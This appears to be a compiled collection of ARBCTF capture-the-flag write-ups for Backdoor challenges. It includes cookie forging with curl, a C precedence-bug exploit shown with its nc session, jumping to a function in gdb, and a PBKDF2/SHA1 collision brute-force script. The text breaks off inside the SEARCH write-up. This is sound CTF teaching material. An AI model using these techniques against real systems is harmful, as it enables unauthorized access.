<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-arbctf
description: CTF writeups and security challenges by ARBCTF.
---

# Writeups by ARBCTF

Source repository: `/repos/ARBCTF`

## Repository Index

- writeups/README.md
- writeups/Potatopla/Challenge 11/README.md
- writeups/Juice Shop/Admin Section/README.md
- writeups/Juice Shop/Basket Access/README.md
- writeups/Juice Shop/Confidential Document/README.md
- writeups/Juice Shop/Five-Star Feedback/README.md
- writeups/Juice Shop/Forged Feedback/README.md
- writeups/Juice Shop/JWT Issues Tier 1/README.md
- writeups/Juice Shop/Login Admin/README.md
- writeups/Juice Shop/Login Jim/README.md
- writeups/Juice Shop/Password Strength/README.md
- writeups/Juice Shop/Payback Time/README.md
- writeups/Juice Shop/Reset Jim's Password/README.md
- writeups/Juice Shop/Score Board/README.md
- writeups/Juice Shop/XSS Tier 1/README.md
- writeups/Juice Shop/Zero Stars/README.md
- writeups/Ghost in the Shellcode/Knockers/README.md
- writeups/Backdoor/CK/README.md
- writeups/Backdoor/DTUNE/README.md
- writeups/Backdoor/FAULT/README.md
- writeups/Backdoor/HIDE-EASY/README.md
- writeups/Backdoor/HIDE-MEDIUM/README.md
- writeups/Backdoor/ISOLVE/README.md
- writeups/Backdoor/JIGSAW/README.md
- writeups/Backdoor/LOCATION-51/README.md
- writeups/Backdoor/LOST-FOUND/README.md
- writeups/Backdoor/LOST/README.md
- writeups/Backdoor/MINDBLOWN/README.md
- writeups/Backdoor/PATH/README.md
- writeups/Backdoor/SEARCH/README.md
- writeups/Backdoor/UNDISPUTED/README.md
- writeups/Backdoor/WEIRD-AUTH/README.md
- writeups/Backdoor/WEIRD-AUTH2/README.md

## Writeup Content


### File: writeups/Backdoor/CK/README.md

http://hack.bckdr.in/CKK/index.php

Let's check out the page:

```
$ curl http://hack.bckdr.in/CKK/index.php
<html>
	<head>
	</head>
	<body>
		<div>
		Authorizes Persons Only
		</div>
	</body>
</html>
```

And let's make a `HEAD` request to get the headers:

```
$ curl -I http://hack.bckdr.in/CKK/index.php
HTTP/1.1 200 OK
Date: Tue, 11 Oct 2016 22:10:45 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.17
Set-Cookie: admin=0
Content-Type: text/html
```

Hmm, the `admin` cookie looks interesting...

```
$ curl -b admin=1 http://hack.bckdr.in/CKK/index.php

<html>
	<head>
	</head>
	<body>
		<div>
			flag is <redacted>
		</div>
	</body>
</html>
```

Boom!



### File: writeups/Backdoor/DTUNE/README.md

# Backdoor: DTUNE

## URL
https://backdoor.sdslabs.co/challenges/DTUNE
Audio sample: http://hack.bckdr.in/DTUNE/Dtune.wav

## Description
Vector recorded this audio when Gill Bates was opening his/her vault and Gru
stole this recording from him (stealing from a thief ain't a crime, right?).
Help Gru decode this message so that he can ... (Use your imagination)

## Beginning
Immediately upon playing the audio clip, it becomes clear there is some decoding
with regards to the pitches and number of beeps that are played. However, there
are a few limitation. First off, the beeps play too fast for a human to be able
to decode it on the fly. Second of all, it's not immediately clear what type of
decoding needs to be done because it sounds like there is more than two pitches
- making binary not an option.

## Realizations
In the description, it states this is taken from a vault, leading us to think
the beeps come from some type of keypad. After listening to the recording
again, it sounds as though the beeps are reminiscent of an older phone pad.
Trying to think how beeps on a keypad could go to some sort of other
information lead us to think of the T9 keyboard, and the struggles of texting
on one of those.

Popping open https://www.sainsmograf.com/t9-emulator/ it is feasible that
each tone corresponds to a key. Now to figure out how to map each tone to a key.

Doing a Google search of 'keypad dial tones' gives the first result of 'DTMF
Dial Tones'. Clicking on the [link](http://onlinetonegenerator.com/dtmf.html)
and messing around with the buttons definitely solidifies the connection
between the DTMF tones and the recording. After all, the problem is titled
'DTUNE'.

This result doesn't really help us because it is still too difficult to map a
key to a tone in an efficient manner. Yes, at this time many people have
probably thrown the clip into an audio program to slow it down and to be able
to better analyze the tones. This is fine, although still difficult to match a
tone with a button. Lucky for us, there is an online decoder of DTMF tones.
This [site](http://dialabc.com/sound/detect/) allows us to upload the audio
clip and then get a list of the keys output.

After uploading the clip and getting the numbers that correspond to each tone,
we can go back to our T9 emulator and punch in a few. The list of numbers output
from the audio upload site is:
[8, 4, 3, 0, 3, 5, 2, 4, 0, 4, 7, 7, 0, 7, 4, 4, 2, 2, 5, 6, 0, 6, 3, 0, 3, 7,
 2, 3, 4, 9, 4, 6, 2, 2, 7, 9]
Typing the '843' into the emulator yeilds 'the'. Awesome! This seems like a
winner! After a little monkeying around, it can be deduced that the '0' is a
space. Therefore the first bit of numbers turns into 'the flag grr phi2256'.
Woah, that doesn't seem right...

Well, the DTMF decoder isn't 100% accurate, apparently the output and exact
number of tones in the audio isn't perfect. What the decoder did give us is the
mapping of each pitch to each number, just not the correct repetition of that
number. If the audio has been slowed down at this point, it might be worthwhile
to slowly go through it and get the exact number of repetitions associated with
each tone.

After rectifying that mismatch, it might come out to be 'the flag is phi2256'
when typed into the predictive text keyboard. This still is a bit funky.
However, seeing the 256 at the end of that word and knowing how the flags are
usually hidden on this site helps us recognize that T9 doesn't have 'SHA256'
in it's dictionary. This now becomes 'the flag is sha256'. At this point, it
can be realized that the predictive text from the T9 emulator isn't the most
accurate. Instead, going by the number of beeps and looking at the T9 keypad is
more accurate, especially because the actual string that needs to be 'SHA256'ed
will be a jumble of characters.

## Conclusion
The correct number of key repeats is:
84433 33355524 4447777 7777442256 666333 337222344994462222779 (with 0's
substituded for spaces to ease readability) and the four "2's" in the flag
part of the answer is actually broken up into a 'C' and a 'A'. If you listen
closely (there's a small pause between letters).

In the end the text is "The flag is sha256 of PLZ_GO_DO_IT_YOURSELF"
The trickiest part after getting most of the legwork done, was figuring out
the flag itself needed to be capitalized. This alone took a while to figure out
since it was thought the decoding was incorrect still.

Happy Hunting!



### File: writeups/Backdoor/FAULT/README.md

https://backdoor.sdslabs.co/challenges/FAULT

Lets just include the code here:

```
#include <stdio.h>
#include <fcntl.h>

void secure_function(char* secret,char* input, char* key){
	int i;
	int secret_key=100;
	for (i = 0; i < 10; i++) {
		input[i]^=(key[i]^secret_key);
	}
	if ( !strncmp(input,secret,10) ){
		system("/bin/cat flag");
	}
	else{
		printf("Told you it's secure as :P\n");
	}
}

int main(int argc, char* argv[]){
	int fd,len;
	if (fd=open("password",O_RDONLY,0400) < 0) {
		printf("can't open password\n");
		return 0;
	}
	printf("Complex encryptions always take time...\n");
	sleep(time(0)%15);

	char secret[11];
	if(!(len=read(fd,secret,10) > 0)){
		printf("read error\n");
		close(fd);
		return 0;
	}

	char password[11];
	printf("Password : ");
	scanf("%10s", password);

	char key[11];
	printf("Key : ");
	scanf("%10s", key);

	//secure hash function
	secure_function(secret,password,key);

	close(fd);
	return 0;
}
```

We considered many possibilities here before arriving at the answer.

There's the obvious quick glance for buffer overflows or format string
vulnerabilities, but there doesn't appear to be any.

Next we considered some kind of timing attack, or other side-channels, but the
`sleep` call prevents that (and that seems overkill for this problem).

Then we put on our math hats and dug into the XOR operations for a bit. This
seems obviously wrong since the `secret` will still remain secret despite any
bit fiddling.

Hmm, so what could it be... We sat around scratching our heads for a few
minutes. Finally we noticed that for some reason the connection would hang
waiting on input before asking for the password. We'd have to hit enter to
get prompted for the password. Then we took a closer look at the following code:

```
if (fd=open("password",O_RDONLY,0400) < 0) {
    printf("can't open password\n");
    return 0;
}
```

Aha! The `<` operator takes greater precedence than the `=` operator!

The `open` call will never return a file descriptor less than `0`, so `fd`
will always end up being `0`. Remember that the `0` file descriptor corresponds
to `stdin`, so now we control `secret` in the following code:

```
if(!(len=read(fd,secret,10) > 0)){
	printf("read error\n");
	close(fd);
	return 0;
}
```

Since `fd` is `stdin` and we control `stdin` then we can put whatever we want
in `secret`!

But we're not quite done yet...

We still have to deal with this mess:

```
int secret_key=100;
for (i = 0; i < 10; i++) {
	input[i]^=(key[i]^secret_key);
}
```

First, `100` -> `0x64` -> `'d'`.

So setting `key` to `'dddddddddd'` and making `secret` and `input` the same
thing should get it done.

Lets try it out:

```
$ nc hack.bckdr.in 8012
Complex encryptions always take time...
abcdefghij
Password : abcdefghij
Key : dddddddddd
Flag is SHA256{Pwn1N9_15_MY_N1Nj4_w4y}
```

Voila!



### File: writeups/Backdoor/HIDE-EASY/README.md

https://backdoor.sdslabs.co/challenges/HIDE-EASY

```
$ wget http://hack.bckdr.in/HIDE-EASY/hide_easy
$ file hide_easy
hide_easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=cf56f38a7483f0f337aa3b25644426028885c9b9, not stripped
$ strings hide_easy
/lib/ld-linux.so.2
;%dD&
libc.so.6
_IO_stdin_used
puts
printf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
QVhl
[^_]
939d9556640d4
47f5847d92e9fbbd4d762036ff684ccde6a80d3a171c4dcd0b724fae25826c36
What do you think you will get here?
;*2$"
GCC: (Ubuntu/Linaro 4.7.3-1ubuntu1) 4.7.3
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6339
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
code.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
printf@@GLIBC_2.0
_edata
_fini
__data_start
puts@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
print_flag
__TMC_END__
_ITM_registerTMCloneTable
_init
```

Hmm, `47f5847d92e9fbbd4d762036ff684ccde6a80d3a171c4dcd0b724fae25826c36` sure looks like a hash.



### File: writeups/Backdoor/HIDE-MEDIUM/README.md

https://backdoor.sdslabs.co/challenges/HIDE-MEDIUM

Alright, let's grab the file...

```
$ wget http://hack.bckdr.in/HIDE-MEDIUM/hide_medium
$ file hide_medium 
hide_medium: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fe9ddc13d0659e1badb3fd04934d02b4aa60893a, not stripped
```

Ok, so it's a binary.

```
$ strings hide_medium 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
puts
__stack_chk_fail
printf
__libc_start_main
__gmon_start__
GLIBC_2.4
GLIBC_2.0
PTRh
QVhq
l[^_]
[^_]
KI!!
It's not that easy as you think so
;*2$"(
GCC: (Ubuntu/Linaro 4.7.3-1ubuntu1) 4.7.3
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6339
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
code.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
printf@@GLIBC_2.0
_edata
_fini
__stack_chk_fail@@GLIBC_2.4
__data_start
puts@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
print_flag
__TMC_END__
_ITM_registerTMCloneTable
_init
```

Cheeky: `It's not that easy as you think so`

But I also see `print_flag`.

If we run it through `objdump -D` it looks like `print_flag` is a function. Let's try and hit the function with GDB.

```
$ gdb -q hide_medium 
Reading symbols from hide_medium...(no debugging symbols found)...done.
(gdb) info address print_flag
Symbol "print_flag" is at 0x804849c in a file compiled without debugging.
(gdb) break main
Breakpoint 1 at 0x8048574
(gdb) run
Starting program: /home/matt/ctf/hide_medium 

Breakpoint 1, 0x08048574 in main ()
(gdb) set $eip = 0x804849c
(gdb) continue
Continuing.
<redacted>

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

Got it.



### File: writeups/Backdoor/ISOLVE/README.md

# Write-up on Backdoor's ISOLVE Challenge

## URL

https://backdoor.sdslabs.co/challenges/ISOLVE

## Introduction

The server gives you a regular expression to which you are expected to provide a string that will match it. You have approximately 10 seconds to provide an answer before the server times out and disconnects. Regexes are given in a random order each time, so you won't be able to just replay previous answers.

## Screen-scraping the regexes

The first step was to grab all of the regexes from the server, in the hopes that there were only a finite number of regexes in the server's list. The included python3 script `1-scraper.py` does this by continously connecting to the server, parsing out the regex given, and then disconnecting. We ran the script for a while until the number of unique regexes stopped increasing, at which point we were fairly certain we had all of them. In this case, there were 48 regexes, which you can see in the included `regexes.txt` file.

## Manually solving the regexes

The next step was to find strings which matched the given regexes. As there were only 48 regexes, the fastest method here was to just manually create matching strings. The included python3 script `2-solve_regexes.py` script does this by asking the user for solutions and then checking them using the `re` module.

Note that two of the regexes needed to be altered slightly, specifically `\.?["boys"]{4}\.?` and `[^lol\s=]+["young"]{2}` because python's `re` module doesn't honor double-quoted strings in character sets. To fix this, the script replaces the double-quotes and brackets with parentheses (which should be equivalent) before asking the user for a matching string.

Once matching strings for all the regexes are given, the answers are written to the `solutions.json` file.

## Automatically submitting answers

The final step was to submit the given solutions to the server. The included python3 script `3-solver.py` does this using the [pexpect](https://pexpect.readthedocs.io/en/stable/) module and the `solutions.json` file from the previous step. It scrapes the regex from the server response and submits the appropriate solution from the `solutions.json` file. The flag is returned as part of the 'last lines from the server' log entry.




### File: writeups/Backdoor/JIGSAW/README.md

# Write-up on Backdoor's JIGSAW Challenge

## URL

https://backdoor.sdslabs.co/challenges/JIGSAW

## Introduction

Jigsaw starts out with a tarball `jigsaw.tar.gz` containing 64 'puzzle pieces' which are 100x100-pixel png files. There is an additional clue in the puzzle description:

> Hint: The pattern on letter seems suspicious


## Assembling the pieces

There was no real 'trick' here; we just worked on assembling the pieces manually through trial-and-error. After some initial effort, a few things became clear:

- The pieces assembled into 2x2 squares to form pictures of letters.
- The background of the pieces was not consistent; that is, the 2x2 squares could consist of both white-on-black pieces and black-on-white pieces (hence the hint).
- Telling whether or not the pieces fit together was tricky; sometimes there was only a few pixels difference in alignment.

Once all of the pieces were assembled, we had pictures of the following 16 letters:

```
B D E E E G I L L N O P U V Z Z
```

(Included in this directory is `assemble.py` which is a python3 script that uses [Pillow](https://python-pillow.org/) to assemble the pieces into 16 pictures. Just place it in the same directory as `jigsaw.tar.gz` and let 'er rip. The new pictures will be placed in an output directory called `tiles`.)


## Decoding the message

The most straightforward thing to try next is rearranging the letters to form a message. For this, I used the [Internet Anagram Server](http://wordsmith.org/anagram/). Unfortunately, with so many letters IAS will generate a lot of results, so I started looking through the results for long words. One that stuck out was `PUZZLE`. I refined the search using the [Advanced Anagramming](http://wordsmith.org/anagram/advanced.html) panel to search for anagrams with the word 'PUZZLE'. I also set the minimum word size to 4 to try and cull the list further.

This gave 30 results, one of which was

> PUZZLE BEING LOVED

This result stuck out to me, because it could be rearranged to form a seemingly-relevant sentence:

> LOVE BEING PUZZLED

Which, as is turns out, is the secret key:

```
SHA256{LOVEBEINGPUZZLED}
```


## Epilogue: Overthinking Things

I admittedly spent way too much time overthinking the solution to this puzzle, mostly due to misreading what the hint meant. It led me to believe that the background pattern on each of the tiles was an attempt to encode a message in binary (black = 0, white = 1, 4 bits per tile). This would mean that the tiles would need to be put in a specific order to decode the message.

If this is the case, however, simply rearranging the letters to spell out a message wasn't enough because some letters (such as 'E') were repeated, and there was no way to determine which 'E' went where.

After an hour or so of struggling with this idea, I noted the point value of the problem and adjusted my expectations accordingly :-P



### File: writeups/Backdoor/LOCATION-51/README.md

https://backdoor.sdslabs.co/challenges/LOCATION-51

Visiting http://hack.bckdr.in/LOCATION-51/index.html requires a password.
Let's check what the HTML looks like...

```
$ curl http://hack.bckdr.in/LOCATION-51/index.html<!DOCTYPE html>
<html>
<script type="text/javascript">
    window.location.href="trap.html";
</script>
<style type="text/css">
    @import url(http://fonts.googleapis.com/css?family=Open+Sans);
    body {
        font-family: 'Open Sans';
        font-size: 25px;
    }
    #title {
        text-align: center;
        margin-bottom: 100px;
    }
    #body {
    }
    #wrapper {
        padding: 20px 250px 250px 250px;
        margin: 100px 250px;
        border: 2px solid black;
    }
</style>
<head>
    <title>LOCATION 51</title>
</head>
<body>
    <div id="wrapper">

        <div id="title">
            LOCATION 51
        </div>
        <div id="body">
            This is the secret location of all backdoor hackers. Please do not disclose this location to NSA/FBI.
            <br><br>
            Our aim is World Domination.
        </div>

    </div>
<script type="text/javascript">
    a = prompt("Password");
    if(a=="H4CK3D")
    {
        alert("Flag is "+atob("T0hIX1kwVV9DNE5fQkwwQ0tfSkFWQVNDMVBUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA"));
    }
    else
    {
        alert("Wrong Password!");
    }
</script>
</body>
</html>
```

This bit looks interesting:

```
alert("Flag is "+atob("T0hIX1kwVV9DNE5fQkwwQ0tfSkFWQVNDMVBUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA"));
```

Entering `H4CK3D` as the password to the website doesn't give us anything too
useful. Let's see what this `atob` stuff is all about. Running that command in
a Javascript interpreter gives us:

```
-> atob("T0hIX1kwVV9DNE5fQkwwQ0tfSkFWQVNDMVBUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA")
<- "OHH_Y0U_C4N_BL0CK_JAVASC1PT
```

And finally:

```
$ echo -n "OHH_Y0U_C4N_BL0CK_JAVASC1PT" | sha256sum
72ded46b20570bf346b470593f9d7e026a12b5e49f9245dc6bd0f1d610c1aa57
```



### File: writeups/Backdoor/LOST-FOUND/README.md

https://backdoor.sdslabs.co/challenges/LOST-FOUND

```
$ wget http://hack.bckdr.in/LOST-FOUND/lost_found.zip
$ file lost_found.zip
lost_found.zip: Zip archive data, at least v1.0 to extract
$ unzip lost_found.zip
Archive:  lost_found.zip
   creating: .git/
  inflating: .git/packed-refs
 extracting: .git/ORIG_HEAD
   creating: .git/hooks/
  inflating: .git/hooks/update.sample
  inflating: .git/hooks/commit-msg.sample
  inflating: .git/hooks/applypatch-msg.sample
  inflating: .git/hooks/pre-commit.sample
  inflating: .git/hooks/pre-rebase.sample
  inflating: .git/hooks/pre-applypatch.sample
  inflating: .git/hooks/pre-push.sample
  inflating: .git/hooks/prepare-commit-msg.sample
  inflating: .git/hooks/post-update.sample
   creating: .git/lost-found/
   creating: .git/lost-found/commit/
 extracting: .git/lost-found/commit/f7cee847b02a589cd3d0fa4e2c32cf9a0ccd94a6
   creating: .git/branches/
   creating: .git/refs/
   creating: .git/refs/remotes/
   creating: .git/refs/remotes/origin/
 extracting: .git/refs/remotes/origin/HEAD
   creating: .git/refs/tags/
   creating: .git/refs/heads/
 extracting: .git/refs/heads/master
   creating: .git/info/
  inflating: .git/info/exclude
   creating: .git/logs/
   creating: .git/logs/refs/
   creating: .git/logs/refs/remotes/
   creating: .git/logs/refs/remotes/origin/
  inflating: .git/logs/refs/remotes/origin/HEAD
   creating: .git/logs/refs/heads/
 extracting: .git/logs/refs/heads/master
  inflating: .git/config
  inflating: .git/COMMIT_EDITMSG
   creating: .git/objects/
   creating: .git/objects/53/
 extracting: .git/objects/53/18b5ac7a2fda718b2353ac068aa816398fa3e5
   creating: .git/objects/pack/
  inflating: .git/objects/pack/pack-ae01a765b19fb088d98519e7105a67e3cadc4582.pack
  inflating: .git/objects/pack/pack-ae01a765b19fb088d98519e7105a67e3cadc4582.idx
   creating: .git/objects/f9/
 extracting: .git/objects/f9/943c7fc5d4335746389f9955841666a3801661
   creating: .git/objects/info/
   creating: .git/objects/f7/
 extracting: .git/objects/f7/cee847b02a589cd3d0fa4e2c32cf9a0ccd94a6
 extracting: .git/HEAD
  inflating: .git/description
  inflating: .git/index
```

Hmm, looks like a git repo.

```
$ grep -rn flag .git/
.git/COMMIT_EDITMSG:10:#    new file:   flag.txt
$ cat .git/COMMIT_EDITMSG
Updates API token instructions
# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
# rebase in progress; onto 16b2048
# You are currently editing a commit during a rebase.
#
# Changes to be committed:
#   modified:   README.md
#   new file:   flag.txt
#
```

Looks like we're looking for the contents of this `flag.txt` file.

```
$ git log -n1
commit 3b161f0d331a45e48b8866fc4fb85ade0d4fa0f6
Author: Abhay Rana <capt.n3m0@gmail.com>
Date:   Tue Feb 10 22:05:37 2015 +0530
    Updates API token instructions
$ git show 3b161f0d331a45e48b8866fc4fb85ade0d4fa0f6
commit 3b161f0d331a45e48b8866fc4fb85ade0d4fa0f6
Author: Abhay Rana <capt.n3m0@gmail.com>
Date:   Tue Feb 10 22:05:37 2015 +0530
    Updates API token instructions
diff --git a/README.md b/README.md
index cd30cd9..07c3fab 100644
--- a/README.md
+++ b/README.md
@@ -26,7 +26,7 @@ Configuration Options:
 - **INCOMING_TOKEN** Service Token from Slack's incoming webhook
 - **TEAM_DOMAIN** Domain name of your slack team (just sdslabs, not sdslabs.slack.com)
 - **SESSION_SECRET** Session secret key
-- **API_TOKEN** API Token for the slack team. Generated at <https://api.slack.com> (scroll to bottom).
+- **API_TOKEN** API Token for the slack team. Generated at <https://api.slack.com/web> (scroll to bottom).

 These configuration options can either be provided via a `.env` file in development, or via Heroku config variables, if you are deploying to Heroku. A sample env file is provided in `.env.sample`. You can see service tokens on the left sidebar in Slack configuration.
```

This looks like part of it, maybe we lost something...

```
$ ls .git/lost-found/commit/
f7cee847b02a589cd3d0fa4e2c32cf9a0ccd94a6
$ cat .git/lost-found/commit/f7cee847b02a589cd3d0fa4e2c32cf9a0ccd94a6
f7cee847b02a589cd3d0fa4e2c32cf9a0ccd94a6
$ git show f7cee847b02a589cd3d0fa4e2c32cf9a0ccd94a6
commit f7cee847b02a589cd3d0fa4e2c32cf9a0ccd94a6
Author: Abhay Rana <capt.n3m0@gmail.com>
Date:   Tue Feb 10 22:05:37 2015 +0530
    Updates API token instructions
diff --git a/README.md b/README.md
index cd30cd9..07c3fab 100644
--- a/README.md
+++ b/README.md
@@ -26,7 +26,7 @@ Configuration Options:
 - **INCOMING_TOKEN** Service Token from Slack's incoming webhook
 - **TEAM_DOMAIN** Domain name of your slack team (just sdslabs, not sdslabs.slack.com)
 - **SESSION_SECRET** Session secret key
-- **API_TOKEN** API Token for the slack team. Generated at <https://api.slack.com> (scroll to bottom).
+- **API_TOKEN** API Token for the slack team. Generated at <https://api.slack.com/web> (scroll to bottom).

 These configuration options can either be provided via a `.env` file in development, or via Heroku config variables, if you are deploying to Heroku. A sample env file is provided in `.env.sample`. You can see service tokens on the left sidebar in Slack configuration.

diff --git a/flag.txt b/flag.txt
new file mode 100644
index 0000000..5318b5a
--- /dev/null
+++ b/flag.txt
@@ -0,0 +1 @@
+FLAG IS 676a0b9e546e1920c0ff6631f4aac3a9646d843c6bd6d333dda542987570c1b6
```

Lost, and found.



### File: writeups/Backdoor/LOST/README.md

https://backdoor.sdslabs.co/challenges/LOST

It tells us to visit http://hack.bckdr.in/LOST/

Which then tells us to check out the console. Let's grab the source first:

```
$ curl -X GET http://hack.bckdr.in/LOST
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://hack.bckdr.in/LOST/">here</a>.</p>
<hr>
<address>Apache/2.4.7 (Ubuntu) Server at hack.bckdr.in Port 80</address>
</body></html>
```

Bleh, we have to follow the redirect...

```
$ curl -L -X GET http://hack.bckdr.in/LOST
<!DOCTYPE html>
<html>
<head>
	<title>Welcome to Web-50</title>
	<style>
	body {
		width: 100%;
	}
	.welcome-msg, .info {
		text-align:  center;
	}
	</style>
</head>
<body>
<p class="welcome-msg">
Hi! Welcome to Web-50!
</p>
<br/>
<p class="info">
<b>Flag</b> is somewhere around and simple to get, just sneak well in console.
</p>
<br/>
</body>
<script>
if(!window.console) {
	window.alert('You need a console n00b');
} else {
	window.console.log('Welcome n00b to the ctf');
	window.console.log('n00b sometimes you need to POST to flag.php');
}
</script>
</html>
```

And after we follow the instructions:

```
$ curl -X POST hack.bckdr.in/LOST/flag.php
You did well
Here is you flag: <redacted>
```

Ez pz.



### File: writeups/Backdoor/MINDBLOWN/README.md

# Backdoor: MINDBLOWN

## URL: https://backdoor.sdslabs.co/challenges/MINDBLOWN

## Description
Figure out the correct login information for Chintu's site utilizing the login
logic provided.

## Resources
The starting page that links to the login page is [here](http://hack.bckdr.in:9003/).

The login logic is as follows:
```
var express = require('express');
var app = express();
var port = process.env.PORT || 9898;
var crypto = require('crypto');
var bodyParser = require('body-parser')
var salt = 'somestring';
var iteration = /// some number here;
var keylength = // some number here;

app.post('/login', function (req, res) {
    var username = req.body.username;
    var password = req.body.password;
    if (username !== 'chintu') {
        res.send('Username is wrong');
        return;
    }
    if (crypto.pbkdf2Sync(password, salt, iteration, keylength).toString() === hashOfPassword) {
        if (password === 'complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg') {
            // some logic here and return something
        } else {
            // return flag here
        }
    } else {
        res.send('Password is wrong');
    }
});
```


## Beginnings/Realizations

After studying the logic for a bit you quickly realize that the login name is
"chintu" and the password has to be "complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg".
However, it then becomes apparent that if the password input is the one given
above, then you will always trigger the first nested if statement, and not the
second one, which is the one we want. Knowing a little bit about hashes and
that it is possible to have two different strings map to the same hash, screams
"HASH COLLISION" for this problem. After doing a quick google search of the
`crypto.pbkdf2Sync collision` we find a site that describes the problemn, and
also a python function to display them.

Here's the python program that can be run to detect collisions:
```
#!/usr/bin/env python
# coding=utf-8

import hashlib
import itertools
import re
import string
import sys

TOTAL_LENGTH = 65
PREFIX = sys.argv[1] if len(sys.argv) > 1 else ''

prefix_length = len(PREFIX)
brute_force_length = TOTAL_LENGTH - prefix_length
passwords = itertools.product(string.ascii_lowercase, repeat=brute_force_length)
regex_printable = re.compile('[\x20-\x7E]+$')
base_hasher = hashlib.sha1()
base_hasher.update(PREFIX)

for item in itertools.imap(''.join, passwords):
    hasher = base_hasher.copy()
    hasher.update(item)
    sha1_hash = hasher.digest()
    if regex_printable.match(sha1_hash):
        print u'%s \U0001F4A5 %s'.encode('utf-8') % (PREFIX + item, sha1_hash)
```

After saving the above code to `collision.py` you can run it as follows:
`python collision.py complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg`
It will output the password whose hash also collides with the above password.
Submitting this output as our password with "chintu" as the user will give us
the flag!

Happy hacking!



### File: writeups/Backdoor/PATH/README.md

https://backdoor.sdslabs.co/challenges/PATH

Hmmm, "The flag is somewhere on the domain flag.bckdr.in"

Hmmm... domain...

```
$ dig ANY flag.bckdr.in
; <<>> DiG 9.9.5-4.3ubuntu0.2-Ubuntu <<>> ANY flag.bckdr.in
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 65328
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 2, ADDITIONAL: 1
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;flag.bckdr.in.         IN  ANY
;; ANSWER SECTION:
flag.bckdr.in.      300 IN  TXT "e4de7470b35f7b3627283a61a808d32b99f91d5a1092a892bdb5bcdb4af3b7ab"
flag.bckdr.in.      300 IN  A   173.194.126.99
;; AUTHORITY SECTION:
bckdr.in.       80869   IN  NS  kip.ns.cloudflare.com.
bckdr.in.       80869   IN  NS  lisa.ns.cloudflare.com.
;; Query time: 15 msec
;; SERVER: 1.1.1.1#53(1.1.1.1)
;; WHEN: Thu Mar 26 19:16:01 EDT 2015
;; MSG SIZE  rcvd: 189
```

```
...
;; ANSWER SECTION:
flag.bckdr.in.      300 IN  TXT "e4de7470b35f7b3627283a61a808d32b99f91d5a1092a892bdb5bcdb4af3b7ab"
...
```

That sure looks like a flag to me.



### File: writeups/Backdoor/SEARCH/README.md

https://backdoor.sdslabs.co/challenges/SEARCH


```
$ wget http://hack.bckdr.in/SEARCH/search.zip
$ file search.zip
search.zip: Zip archive data, at least v2.0 to extract
```

K...

```
$ unzip search.zip
Archive:  search.zip
  inflating: search.txt
$ strings search.txt
JFIF
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
*huY
okuq
~ |G
y|A.
Z\k7Z^
}F;i
4;{[
iV3\
x~-#
ouuo
x~-#
qkkq
4;{[
]*huX-
>    |h
|Uww
]*huX-
[Awi}
lu]:
iV3\
-tk{
>*xWM
[j7qM
~ |G
nR+I
j7ZT0
Owwc
qkkq
qkkq
TxsM
okuq
Oiic
~4|@
~ |8
u}_\
t]wW
~ _i
l~+|
/<Ay
wZri
*huY
~5|G
TxsR
~4|@
y|A.
wZri
-mn4;]9
okuq
m-<+c
]*huX-
#_`~
>4|m
m-<+c
~0|4
_xWR
~ |8
-mn4;
m-<+c
